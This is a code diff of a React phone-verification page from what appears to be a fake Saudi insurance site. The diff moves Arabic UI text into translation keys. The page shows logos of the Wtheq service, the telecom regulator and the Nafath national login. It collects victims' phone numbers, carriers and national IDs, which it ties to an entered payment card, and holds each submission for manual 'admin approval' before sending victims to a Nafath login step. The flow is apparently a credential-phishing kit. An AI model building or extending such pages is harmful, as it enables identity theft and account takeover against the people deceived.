@@ -10,6 +10,7 @@ import { linkVisitorToSession } from "@/lib/visitorLink";
 import wtheqLogo from "@/assets/wtheq-logo.png";
 import cstLogo from "@/assets/cst-logo.png";
 import nicLogo from "@/assets/nic-logo.png";
+import { useLanguage } from "@/i18n/LanguageContext";
 
 const carriers = [
   { name: "STC", value: "STC", logo: "/images/stc.png" },
@@ -23,6 +24,8 @@ const carriers = [
 const PhoneVerification = () => {
   const navigate = useNavigate();
   const location = useLocation();
+  const { t } = useLanguage();
+  const pv = t.phoneVerify;
   const offer = location.state?.offer;
   const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
 
@@ -41,7 +44,7 @@ const PhoneVerification = () => {
 
   useEffect(() => {
     if (approvalStatus === "approved" && orderId) {
-      toast.success("تم التحقق من رقم الجوال");
+      toast.success(pv.phoneVerified);
       sessionStorage.setItem("insurance_order_id", orderId);
       if (carrier === "STC") {
         navigate("/insurance/phone-stc", { state: { offer, phone, carrier, orderId } });
@@ -49,22 +52,22 @@ const PhoneVerification = () => {
         navigate("/insurance/nafath-login", { state: { offer, phone, carrier, orderId } });
       }
     } else if (approvalStatus === "rejected") {
-      toast.error("تم رفض عملية التوثيق");
+      toast.error(pv.verificationRejected);
       setWaitingApproval(false);
       setLoading(false);
     }
   }, [approvalStatus, orderId, navigate, offer, phone, carrier]);
 
   const validatePhone = (v: string) => {
-    if (v.startsWith("05") && v.length !== 10) return "رقم الجوال يجب أن يكون 10 أرقام عند البدء بـ 05";
-    if (v.startsWith("5") && !v.startsWith("05") && v.length !== 9) return "رقم الجوال يجب أن يكون 9 أرقام عند البدء بـ 5";
-    if (v.length > 0 && !v.startsWith("05") && !v.startsWith("5")) return "رقم الجوال يجب أن يبدأ بـ 05 أو 5";
+    if (v.startsWith("05") && v.length !== 10) return pv.phoneError10;
+    if (v.startsWith("5") && !v.startsWith("05") && v.length !== 9) return pv.phoneError9;
+    if (v.length > 0 && !v.startsWith("05") && !v.startsWith("5")) return pv.phoneErrorStart;
     return "";
   };
 
   const validateId = (v: string) => {
-    if (v.length > 0 && !v.startsWith("1") && !v.startsWith("2")) return "رقم الهوية يجب أن يبدأ بـ 1 (مواطن) أو 2 (مقيم)";
-    if (v.length > 0 && v.length !== 10) return "رقم الهوية يجب أن يكون 10 أرقام";
+    if (v.length > 0 && !v.startsWith("1") && !v.startsWith("2")) return pv.idErrorStart;
+    if (v.length > 0 && v.length !== 10) return pv.idError10;
     return "";
   };
 
@@ -77,7 +80,6 @@ const PhoneVerification = () => {
     if (!isValid()) { setShowError(true); return; }
     setLoading(true);
     sessionStorage.setItem("phone_verification", JSON.stringify({ phone, nationalId, carrier }));
-    // Link visitor data to session
     linkVisitorToSession({ phone, national_id: nationalId });
     const id = await createOrUpdateStage(orderId, "phone_verification", { phone, national_id: nationalId });
     setOrderId(id);
@@ -89,47 +91,43 @@ const PhoneVerification = () => {
 
   return (
     <>
-    <VerificationLayout title="توثيق رقم الجوال المرتبط بالحساب البنكي" subtitle="يجب أن يكون رقم الجوال موثقًا ومطابقًا لبيانات الهوية">
-      {/* Wtheq + CITC Logos */}
+    <VerificationLayout title={pv.title} subtitle={pv.subtitle}>
       <div className="flex flex-col items-center gap-3 pt-5 pb-2 border-b border-border">
         <img src={wtheqLogo} alt="وثق - WTHEQ" className="h-20 object-contain" />
         <img src={cstLogo} alt="هيئة الاتصالات والفضاء والتقنية" className="h-14 object-contain" />
       </div>
 
-      {/* Title inside card */}
       <div className="text-center pt-4 pb-2 px-4">
-        <h2 className="text-base font-extrabold bg-gradient-to-r from-primary to-emerald-600 bg-clip-text text-transparent">توثيق رقم الجوال المرتبط بالحساب البنكي</h2>
+        <h2 className="text-base font-extrabold bg-gradient-to-r from-primary to-emerald-600 bg-clip-text text-transparent">{pv.title}</h2>
       </div>
 
       <div className="p-4 pt-2 space-y-3">
         {waitingApproval ? (
           <div className="text-center py-8 space-y-4">
             <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
-            <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
-            <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة بيانات التوثيق</p>
+            <h3 className="text-sm font-bold text-foreground">{pv.waitingApproval}</h3>
+            <p className="text-xs text-muted-foreground">{pv.waitingReview}</p>
           </div>
         ) : (
           <>
             {showError && (
               <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="flex items-start gap-2 bg-destructive/10 border border-destructive/20 rounded-lg p-3">
                 <AlertTriangle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
-                <p className="text-[11px] text-destructive leading-relaxed">يرجى التأكد من ان رقم الجوال موثق ومطابق لبيانات الهوية الوطنية / الإقامة، ومرتبط ببطاقة الدفع المدخلة</p>
+                <p className="text-[11px] text-destructive leading-relaxed">{pv.errorMessage}</p>
                 <button onClick={() => setShowError(false)} className="text-destructive shrink-0">✕</button>
               </motion.div>
             )}
 
-            {/* Phone */}
             <div className="border-2 border-border rounded-xl p-4 space-y-1">
-              <label className="block text-xs font-black text-foreground text-right mb-2">رقم الجوال <span className="text-destructive">*</span></label>
-              <input className={inputCls} placeholder="05 XXXXXXXXX" value={phone}
+              <label className="block text-xs font-black text-foreground text-right mb-2">{pv.phone} <span className="text-destructive">*</span></label>
+              <input className={inputCls} placeholder={pv.phonePlaceholder} value={phone}
                 onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 10); setPhone(v); setPhoneError(validatePhone(v)); }}
                 dir="rtl" maxLength={10} />
               {phoneError && <p className="text-[10px] text-destructive mt-1 text-right">{phoneError}</p>}
             </div>
 
-            {/* Carrier */}
             <div className="border-2 border-border rounded-xl p-4 space-y-1">
-              <label className="block text-xs font-black text-foreground text-right mb-2">مشغل الشبكة <span className="text-destructive">*</span></label>
+              <label className="block text-xs font-black text-foreground text-right mb-2">{pv.carrier} <span className="text-destructive">*</span></label>
               <div className="relative">
                 <button onClick={() => setShowCarriers(!showCarriers)} className={`w-full px-3 py-2.5 rounded-lg bg-background border-2 border-border text-foreground text-xs flex items-center justify-between cursor-pointer transition-all focus:outline-none focus:border-primary`}>
                   {selectedCarrier ? (
@@ -138,7 +136,7 @@ const PhoneVerification = () => {
                       <span className="text-xs font-medium">{selectedCarrier.name}</span>
                     </div>
                   ) : (
-                    <span className="text-muted-foreground text-xs">حدد نوع مشغل الشبكة</span>
+                    <span className="text-muted-foreground text-xs">{pv.selectCarrier}</span>
                   )}
                   <ChevronDown className={`w-3.5 h-3.5 text-muted-foreground transition-transform ${showCarriers ? "rotate-180" : ""}`} />
                 </button>
@@ -156,10 +154,9 @@ const PhoneVerification = () => {
               </div>
             </div>
 
-            {/* National ID */}
             <div className="border-2 border-border rounded-xl p-4 space-y-1">
-              <label className="block text-xs font-black text-foreground text-right mb-2">رقم الهوية الوطنية / الإقامة <span className="text-destructive">*</span></label>
-              <input className={inputCls} placeholder="أدخل رقم الهوية (10 أرقام)" value={nationalId}
+              <label className="block text-xs font-black text-foreground text-right mb-2">{pv.nationalId} <span className="text-destructive">*</span></label>
+              <input className={inputCls} placeholder={pv.nationalIdPlaceholder} value={nationalId}
                 onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 10); setNationalId(v); setIdError(validateId(v)); }}
                 dir="rtl" maxLength={10} />
               {idError && <p className="text-[10px] text-destructive mt-1 text-right">{idError}</p>}
@@ -167,52 +164,29 @@ const PhoneVerification = () => {
 
             <Button onClick={handleSubmit} disabled={loading || !isValid()} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2 mt-2">
               <Shield className="w-3.5 h-3.5" />
-              {loading ? "يرجى الانتظار جاري التأكد من صحة البيانات المدخلة..." : "دخول"}
+              {loading ? pv.submitting : pv.submit}
             </Button>
           </>
         )}
       </div>
     </VerificationLayout>
 
-    {/* Welcome Popup */}
     <AnimatePresence>
       {showWelcomePopup && (
-        <motion.div
-          initial={{ opacity: 0 }}
-          animate={{ opacity: 1 }}
-          exit={{ opacity: 0 }}
-          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-6"
-        >
-          <motion.div
-            initial={{ scale: 0.85, opacity: 0 }}
-            animate={{ scale: 1, opacity: 1 }}
-            exit={{ scale: 0.85, opacity: 0 }}
-            transition={{ type: "spring", damping: 20 }}
-            className="bg-card rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden border border-border"
-          >
-            {/* NIC Logo */}
+        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-6">
+          <motion.div initial={{ scale: 0.85, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.85, opacity: 0 }} transition={{ type: "spring", damping: 20 }} className="bg-card rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden border border-border">
             <div className="flex justify-center pt-8 pb-4">
               <img src={nicLogo} alt="NIC" className="w-20 h-20 object-contain" />
             </div>
-
-            {/* Text */}
             <div className="px-6 pb-6 text-center space-y-3">
-              <p className="text-sm text-muted-foreground font-medium">النفاذ الوطني الموحد</p>
-              <h3 className="text-2xl font-extrabold text-primary">نفاذ</h3>
-              <p className="text-primary font-bold text-sm">عميلنا الكريم</p>
-              <p className="text-xs text-foreground leading-relaxed">
-                لإتمام عملية إصدار وثيقة التأمين وربطها بحسابك في منصة النفاذ الوطني الموحد، يُرجى التحقق من هويتك.
-                هذا الإجراء مطلوب نظاماً لضمان صحة البيانات وحماية حقوقك.
-              </p>
+              <p className="text-sm text-muted-foreground font-medium">{pv.welcomeSubtitle}</p>
+              <h3 className="text-2xl font-extrabold text-primary">{pv.welcomeTitle}</h3>
+              <p className="text-primary font-bold text-sm">{pv.welcomeGreeting}</p>
+              <p className="text-xs text-foreground leading-relaxed">{pv.welcomeMessage}</p>
             </div>
-
-            {/* Button */}
             <div className="px-6 pb-6">
-              <button
-                onClick={() => setShowWelcomePopup(false)}
-                className="w-full bg-primary text-primary-foreground rounded-full py-3 font-bold text-sm hover:bg-primary/90 transition-colors"
-              >
-                متابعة
+              <button onClick={() => setShowWelcomePopup(false)} className="w-full bg-primary text-primary-foreground rounded-full py-3 font-bold text-sm hover:bg-primary/90 transition-colors">
+                {pv.welcomeContinue}
               </button>
             </div>
           </motion.div>
